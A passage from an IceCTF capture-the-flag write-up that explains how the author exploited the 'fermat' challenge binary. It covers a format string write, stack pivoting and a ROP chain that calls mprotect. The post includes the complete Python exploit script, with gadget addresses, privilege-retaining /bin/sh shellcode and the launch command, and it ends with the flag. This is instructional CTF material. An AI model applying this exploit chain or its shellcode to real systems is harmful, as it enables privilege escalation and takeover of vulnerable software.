<p>In technical words, this means that <code class="highlighter-rouge">ESP</code> register must point to the beginning of the fake stack I have injected via <code class="highlighter-rouge">USER</code> variable,
and <code class="highlighter-rouge">EIP</code> register must point to a <code class="highlighter-rouge">ret</code> instruction.</p>

<p>To keep things short, I’ll explain here how I managed to obtain the above, together with the exploit. For your information, getting to that solution required a lot of trial and error, and searching thru the stack and text section with GDB.</p>

<h3 id="the-exploit">The Exploit</h3>

<p>Let’s see how to use our format string vulnerability.
This is a snapshot of memory layout when hitting the vulnerable <code class="highlighter-rouge">printf()</code>:</p>

<p><img src="/media/images/icectffermat_3.JPG" alt="AltText" /></p>

<p>Looking at output from <code class="highlighter-rouge">bt</code> and <code class="highlighter-rouge">stack</code> we can examine the how stack frames where formed.
We are in function <code class="highlighter-rouge">payload()</code>, and there on the stack we have:</p>
<ul>
  <li>Saved EBP and Saved EIP (pointing to <code class="highlighter-rouge">dispatch + 40</code>) to restore <code class="highlighter-rouge">dispatch</code>;</li>
  <li>Saved EBP and Saved EIP (pointing to <code class="highlighter-rouge">main + 42</code>) to restore <code class="highlighter-rouge">main</code>;</li>
</ul>

<p>We will use a <em>stack pivoting</em> technique to make <code class="highlighter-rouge">ESP</code> point to our fake stack.</p>

<p>The idea is to overwrite Saved EBP in <code class="highlighter-rouge">dispatch</code> frame, at address <code class="highlighter-rouge">0xffffd5a8</code>, to point to our payload injected in <code class="highlighter-rouge">welcome()</code>.</p>

<p>How? We have 7 characters.</p>

<p>The following input: <code class="highlighter-rouge">%14$hn</code> writes 0 in the two bytes starting at the address pointed by the 14th word after the format string.</p>

<p>In practice:</p>
<ul>
  <li>Looking back at the image, the 14th word after the format string is at address <code class="highlighter-rouge">0xffffd588</code>;</li>
  <li>This address points to <code class="highlighter-rouge">0xffffd5a8</code>;</li>
  <li>So, our format string will write 0x0 into <code class="highlighter-rouge">0xffffd5a8</code> and <code class="highlighter-rouge">0xffffd5a9</code></li>
  <li>Previously, <code class="highlighter-rouge">0xffffd5a8</code> contained value <code class="highlighter-rouge">0xffffd5c8</code>;</li>
  <li>After <code class="highlighter-rouge">printf()</code>, it will contain value <code class="highlighter-rouge">0xffff0000</code>.</li>
</ul>

<p>Now, remember the <code class="highlighter-rouge">welcome()</code> function? Thanks to that function, we can write a huge payload into memory, and buffer will grow (in stack, so towards lower addresses), so that we can make the area now written in Saved BP (<code class="highlighter-rouge">0xffff0000</code>) pointing to our payload.</p>

<p>Now I needed to find a way to write that value into <code class="highlighter-rouge">ESP</code> and trigger the ROPChain.</p>

<p>The trick to trigger stack pivoting is using the two <code class="highlighter-rouge">leave</code> instruction in <code class="highlighter-rouge">dispatch</code> and <code class="highlighter-rouge">main</code>:</p>
<ul>
  <li>The first <code class="highlighter-rouge">leave</code> moves <code class="highlighter-rouge">ESP</code> to current <code class="highlighter-rouge">EBP</code>, then copies our overwritten SBP into <code class="highlighter-rouge">EBP</code>;</li>
  <li>The second <code class="highlighter-rouge">leave</code> moves <code class="highlighter-rouge">ESP</code> to current <code class="highlighter-rouge">EBP</code> - <strong>which we injected in the previous frame</strong> - then pops the SBP into EBP, but this doesn’t matter since ESP points to our payload now :)</li>
</ul>

<p>I slightly modified this approach because of these instructions in <code class="highlighter-rouge">main</code>:</p>

<p><img src="/media/images/icectffermat_4.JPG" alt="AltText" /></p>

<p>Following <code class="highlighter-rouge">leave</code>,
the value in memory pointed by <code class="highlighter-rouge">ecx - 4</code> is moved into <code class="highlighter-rouge">esp</code>. Luckily, we can control the content of <code class="highlighter-rouge">ecx</code>, since it is loaded in:
<code class="highlighter-rouge">mov ecx, DWORD PTR [ebp - 0x4]</code>, and <code class="highlighter-rouge">ebp</code> is already pointing to our fake stack.</p>

<p>The rest of the work has just been writing a ROPchain which didn’t contain NULL bytes (that couldn’t reside in <code class="highlighter-rouge">env</code>) – but since the binary is statically linked, I have a whole load of ROP gadgets already linked to binary, found with <code class="highlighter-rouge">ropper</code> – and carefully computing addresses inside and outside gdb. Here, the script to generate the payload, which I used in target machine with:</p>

<p><code class="highlighter-rouge">USER=$(python exploit.py) ./fermat "%14\$hn"</code></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import struct

def p32(address):
  return struct.pack("I", address)

# To compute addresses to store args to mprotect
mprotect_base = 0xffff105c
# mprotect requires a page aligned boundary
stackpage_base = 0xffff1000
# setreuid(geteuid(), geteuid()) &amp;&amp; execve("/bin//sh", NULL, NULL)
shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
shellcode += "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
shellcode += "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"


movdpedx = 0x08055a2b # mov dword ptr [edx], eax; ret
xoreax = 0x08049743 # xor eax, eax; ret
inceax = 0x0807f1bf # inc eax; ret
popedx = 0x08073bda # pop edx; ret
popeax = 0x080bd026 # pop eax; ret
mprotect = 0x8072c50 # address to mprotect

# The ropchain computes args to mprotect and pushes them
# to the right address in fake stack, which is after mprotect_base.
# mprotect_base is a value I have computed by trial, looking
# at where, after payload injection, mprotect address was loaded
# into fake stack.

ropchain = p32(popedx) + p32(mprotect_base + 4) + p32(popeax)
ropchain += p32(stackpage_base - 1) + p32(inceax) + p32(movdpedx)
ropchain += p32(popedx) + p32(mprotect_base + 8) + p32(xoreax)
ropchain += p32(inceax) + p32(movdpedx) + p32(popedx) + p32(mprotect_base + 12)
ropchain += p32(xoreax) + p32(inceax)*7 + p32(movdpedx) + p32(mprotect)
# mprotect_base + 16 points to the shellcode; we need to ret to it.
# BBBB*3 will be overwritten at runtime by movdpedx gadgets.
ropchain += p32(mprotect_base + 16) + "BBBB"*3


payload = "A"*6394  # Distance between 0xffff0000 - 0x4 and start of USER
payload += p32(0xffff1004) # address to load into esp + 0x4
payload += 'A'*4096 # JUNK
payload += ropchain
payload += shellcode
payload += 'A'*(30000 - len(payload)) # just because I used 30k to compute addresses and experiment.
print(payload)
</code></pre></div></div>

<p>IceCTF{s1ze_matt3rs_n0t}</p>


              
                <!--<small>tags: binary-exploitation, writeup, and icectf</small> -->
                <small>
                  tags:
                  
                    
                    <a href="/tags/binary-exploitation"><code class="highligher-rouge"><nobr>binary-exploitation</nobr></code></a>&nbsp;
                  
                    
                    <a href="/tags/writeup"><code class="highligher-rouge"><nobr>writeup</nobr></code></a>&nbsp;
                  
                    
                    <a href="/tags/icectf"><code class="highligher-rouge"><nobr>icectf</nobr></code></a>&nbsp;
                  
                </small>
              
